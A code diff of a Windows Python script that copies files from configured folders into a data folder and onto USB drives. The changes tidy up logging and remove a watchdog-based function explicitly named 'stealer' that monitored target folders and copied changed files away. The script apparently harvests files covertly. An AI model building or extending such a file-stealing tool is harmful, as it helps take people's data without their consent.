@@ -7,11 +7,8 @@ import time
 from queue import Queue
 from typing import Callable, List
 
-import win32api
-
 import win10toast
-from watchdog.events import FileSystemEventHandler
-from watchdog.observers import Observer
+import win32api
 
 NOTICE = True
 CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))
@@ -42,15 +39,15 @@ def settings(_write=False):
         try:
             settings_dict = json.load(open(SETTINGS_PATH))
             globals().update(settings_dict)
-            log(f"settings load:{settings_dict}")
+            log("settings load:\n{}".format("\n".join(f"{k}: {v}\n" for k, v in settings_dict.items())))
             with open(TARGET_SETTINGS_PATH, "r", encoding="utf-8") as f:
                 # 去除空行
                 lines = [line for line in f.read().split("\n") if line != ""]
             globals()["target_folders"] = lines
-            log(f"target set:{lines}")
+            log("target set:{}".format("\n".join(lines)))
         except Exception:
             return settings(_write=True)
-    else:
+    else:  # init settings
         if not os.path.exists(data_folder):
             os.makedirs(data_folder, exist_ok=True)
         with open(SETTINGS_PATH, "w") as f:
@@ -60,10 +57,10 @@ def settings(_write=False):
                 notice=notice,
             )
             json.dump(settings_dict, f)
-        log(f"settings write:{settings_dict}")
+        log("settings write:\n{}".format("\n".join(f"{k}: {v}\n" for k, v in settings_dict.items())))
         with open(TARGET_SETTINGS_PATH, "w", encoding="utf-8") as f:
             f.write("\n".join(target_folders))
-        log(f"target set:{target_folders}")
+        log("target set:{}".format("\n".join(target_folders)))
 
 
 def get_drive_letters():
@@ -75,12 +72,10 @@ def get_drive_letters():
     return drive_letters
 
 
-import psutil
-
-
-def get_all_drive_letters_psutil():
-    """Using the psutil module to get all drive letters, including removable ones."""
-    return [part.mountpoint for part in psutil.disk_partitions()]
+# def get_all_drive_letters_psutil():
+#     """Using the psutil module to get all drive letters, including removable ones."""
+#     import psutil
+#     return [part.mountpoint for part in psutil.disk_partitions()]
 
 
 def copy(src, dst):
@@ -151,30 +146,6 @@ def log(msg):
 def log_manager():
     while True:
         print(output_queue.get())
-
-
-# 定义文件变化事件处理器
-class MyHandler(FileSystemEventHandler):
-    def __init__(self, target_folder: str):
-        super().__init__()
-        self.target_folder: str = target_folder
-        self.target_name: str = os.path.split(self.target_folder)[-1]
-
-    def on_modified(self, event):
-        if event.is_directory:
-            return
-
-        # 获取修改的文件路径
-        src_file = event.src_path
-        # 获取文件在data文件夹中的路径
-        relative_path = os.path.relpath(src_file, self.target_folder)
-        disk_file = os.path.join(data_folder, self.target_name, relative_path)
-
-        # 检查是否需要复制文件
-        if not os.path.exists(disk_file):
-            log(f"TargetDataCopy(watchdog) Copying {src_file} to {disk_file}")
-            copy(src_file, disk_file)
-        data_usb_copy.copy()
 
 
 class DataUsbCopy:
@@ -264,18 +235,6 @@ class TargetDataCopy:
         return copied
 
 
-@Threaded
-def stealer(target_folder):
-    log(f"stealer {target_folder} login")
-    if not os.path.exists(data_folder):
-        os.makedirs(data_folder, exist_ok=True)
-    event_handler = MyHandler(target_folder=target_folder)
-    observer.schedule(event_handler, target_folder, recursive=True)
-    observer.start()
-    observer.join()
-    log(f"stealer {target_folder} logout")
-
-
 # if __name__ == "__main__":
 #     print(get_drive_letters())
 #     print(get_all_drive_letters_psutil())
@@ -286,7 +245,6 @@ if __name__ == "__main__":
     log_manager()
     settings()
     instance_list: List[TargetDataCopy] = []
-    observer = Observer()
     data_usb_copy = DataUsbCopy()
     # for folder in target_folders:
     #     instance_list.append(stealer(folder))
